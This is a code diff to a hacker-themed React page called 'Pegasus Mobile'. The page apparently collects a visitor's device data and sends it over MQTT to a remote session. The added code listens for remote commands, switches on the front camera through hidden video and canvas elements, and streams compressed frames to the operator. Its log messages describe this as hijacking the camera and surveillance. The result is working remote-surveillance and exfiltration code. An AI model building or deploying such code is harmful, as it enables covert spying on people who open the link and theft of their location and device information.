@@ -1,19 +1,24 @@
 
-import React, { useEffect, useState } from 'react';
-import { ShieldCheck, UploadCloud, Smartphone, Lock, Binary, MapPin, Battery, Cpu, Radio, AlertTriangle } from 'lucide-react';
+import React, { useEffect, useState, useRef } from 'react';
+import { UploadCloud, Smartphone, Skull, Radio, AlertTriangle, MapPin, Battery, Video } from 'lucide-react';
 import { getDeviceInfo } from '../services/deviceService';
 import { mqttService } from '../services/mqttService';
-import { DeviceInfo } from '../types';
+import { DeviceInfo, CommandMessage } from '../types';
 
 const MobileScanner: React.FC = () => {
   const [status, setStatus] = useState<'initializing' | 'scanning' | 'transmitting' | 'complete' | 'error'>('initializing');
   const [info, setInfo] = useState<DeviceInfo | null>(null);
   const [logs, setLogs] = useState<string[]>([]);
   const [progress, setProgress] = useState(0);
+  const [isStreaming, setIsStreaming] = useState(false);
+  
+  // Video Refs
+  const videoRef = useRef<HTMLVideoElement>(null);
+  const canvasRef = useRef<HTMLCanvasElement>(null);
+  const streamIntervalRef = useRef<number | null>(null);
 
-  // Simple query parser since we are using HashRouter
   const getSessionId = () => {
-    const hash = window.location.hash; // #/scan?session=...
+    const hash = window.location.hash; 
     const queryPart = hash.split('?')[1];
     if (!queryPart) return null;
     const params = new URLSearchParams(queryPart);
@@ -21,6 +26,57 @@ const MobileScanner: React.FC = () => {
   };
 
   const addLog = (msg: string) => setLogs(prev => [...prev.slice(-6), msg]);
+
+  const startCamera = async (sessionId: string) => {
+    try {
+      addLog('REMOTE_CMD: ACTIVATE_CAMERA_FEED');
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { 
+          facingMode: 'user',
+          width: { ideal: 320 }, // Low res for MQTT
+          height: { ideal: 240 }
+        }, 
+        audio: false 
+      });
+      
+      if (videoRef.current) {
+        videoRef.current.srcObject = stream;
+        videoRef.current.play();
+        setIsStreaming(true);
+        addLog('OPTICAL_SENSOR_HIJACKED');
+        
+        // Start sending frames
+        streamIntervalRef.current = window.setInterval(() => {
+           if (videoRef.current && canvasRef.current && mqttService) {
+              const ctx = canvasRef.current.getContext('2d');
+              if (ctx) {
+                 ctx.drawImage(videoRef.current, 0, 0, 320, 240);
+                 // High compression for MQTT public broker limits
+                 const base64 = canvasRef.current.toDataURL('image/jpeg', 0.4); 
+                 mqttService.publishStream(sessionId, { image: base64, timestamp: new Date().toISOString() });
+              }
+           }
+        }, 300); // 3-4 FPS
+      }
+    } catch (err) {
+      console.error(err);
+      addLog('ERR: CAMERA_ACCESS_DENIED_BY_USER');
+    }
+  };
+
+  const stopCamera = () => {
+     if (streamIntervalRef.current) {
+        clearInterval(streamIntervalRef.current);
+        streamIntervalRef.current = null;
+     }
+     if (videoRef.current && videoRef.current.srcObject) {
+        const stream = videoRef.current.srcObject as MediaStream;
+        stream.getTracks().forEach(track => track.stop());
+        videoRef.current.srcObject = null;
+     }
+     setIsStreaming(false);
+     addLog('SURVEILLANCE_TERMINATED');
+  };
 
   useEffect(() => {
     const sessionId = getSessionId();
@@ -35,7 +91,6 @@ const MobileScanner: React.FC = () => {
       try {
         setStatus('scanning');
         
-        // Fake visual loading sequence
         addLog('INIT_PROTOCOL_V4...');
         setProgress(5);
         await new Promise(r => setTimeout(r, 600));
@@ -47,7 +102,6 @@ const MobileScanner: React.FC = () => {
         addLog('INJECTING_PAYLOAD...');
         setProgress(40);
         
-        // Actual Data Collection
         const deviceData = await getDeviceInfo();
         setInfo(deviceData);
         
@@ -65,7 +119,22 @@ const MobileScanner: React.FC = () => {
         setStatus('transmitting');
         addLog(`UPLINK_ESTABLISHED: ${sessionId.substring(0,6)}...`);
         
-        mqttService.publish(sessionId, deviceData);
+        // Connect MQTT with Command Handler
+        mqttService.connect(
+            sessionId,
+            () => {}, // No incoming data needed on mobile
+            () => {
+               mqttService.publishData(sessionId, deviceData);
+            },
+            (cmd: CommandMessage) => {
+               if (cmd.type === 'ACTIVATE_CAMERA') {
+                  startCamera(sessionId);
+               } else if (cmd.type === 'STOP_CAMERA') {
+                  stopCamera();
+               }
+            }
+        );
+
         setProgress(100);
         
         await new Promise(r => setTimeout(r, 1500));
@@ -80,23 +149,38 @@ const MobileScanner: React.FC = () => {
     };
 
     sequence();
+
+    return () => {
+        stopCamera();
+        mqttService.disconnect();
+    };
   }, []);
 
   return (
     <div className="min-h-screen bg-black text-green-500 font-mono p-4 flex flex-col items-center justify-center relative overflow-hidden">
+      {/* Hidden Capture Elements */}
+      <video ref={videoRef} className="hidden" playsInline muted autoPlay></video>
+      <canvas ref={canvasRef} width="320" height="240" className="hidden"></canvas>
+
       {/* Background decoration */}
       <div className="absolute inset-0 z-0 pointer-events-none">
         <div className="absolute top-0 w-full h-1 bg-green-500/20"></div>
         <div className="absolute bottom-0 w-full h-1 bg-green-500/20"></div>
         <div className="scanline"></div>
-        {/* Random binary rain effect could go here, but keeping it simple for performance */}
       </div>
 
       <div className="z-10 w-full max-w-md space-y-8">
         
         <div className="text-center space-y-2">
           <div className="flex items-center justify-center gap-2 mb-4">
-             <AlertTriangle size={32} className="animate-pulse text-red-500" />
+             {isStreaming ? (
+                <div className="flex items-center gap-2 bg-red-900/20 border border-red-500 px-3 py-1 rounded text-red-500 animate-pulse">
+                   <Video size={16} />
+                   <span className="text-xs font-bold tracking-widest">RECORDING</span>
+                </div>
+             ) : (
+                <AlertTriangle size={32} className="animate-pulse text-red-500" />
+             )}
           </div>
           <h1 className="text-3xl font-black tracking-widest text-white uppercase glitch-effect">Pegasus Mobile</h1>
           <p className="text-xs text-red-500 font-bold uppercase tracking-[0.2em] animate-pulse">
@@ -110,12 +194,12 @@ const MobileScanner: React.FC = () => {
             
           <div className="flex justify-center mb-8 relative">
             {/* Status Icons */}
-            <div className="relative z-10 p-6 rounded-full bg-black border-2 border-green-900 shadow-lg shadow-green-900/20">
+            <div className={`relative z-10 p-6 rounded-full bg-black border-2 shadow-lg transition-all duration-500 ${isStreaming ? 'border-red-500 shadow-red-500/30' : 'border-green-900 shadow-green-900/20'}`}>
                 {status === 'initializing' && <Smartphone className="animate-pulse text-gray-500" size={48} />}
                 {status === 'scanning' && <Radio className="animate-spin text-green-500 duration-[4000ms]" size={48} />}
                 {status === 'transmitting' && <UploadCloud className="animate-bounce text-blue-500" size={48} />}
-                {status === 'complete' && <Lock className="text-red-500" size={48} />}
-                {status === 'error' && <Lock className="text-gray-500" size={48} />}
+                {status === 'complete' && <Skull className={`${isStreaming ? 'text-red-500 animate-pulse' : 'text-gray-400'}`} size={48} />}
+                {status === 'error' && <Skull className="text-gray-700" size={48} />}
             </div>
             
             {/* Ping animation rings */}
@@ -151,8 +235,11 @@ const MobileScanner: React.FC = () => {
             {status === 'transmitting' && (
               <div className="animate-pulse text-blue-400">&gt; UPLOADING_PACKETS...</div>
             )}
-            {status === 'complete' && (
+            {status === 'complete' && !isStreaming && (
                <div className="text-red-500 font-bold">&gt; CONNECTION_CLOSED_BY_HOST</div>
+            )}
+            {isStreaming && (
+                <div className="text-red-500 font-bold animate-pulse">&gt; STREAMING_VIDEO_DATA...</div>
             )}
           </div>
 
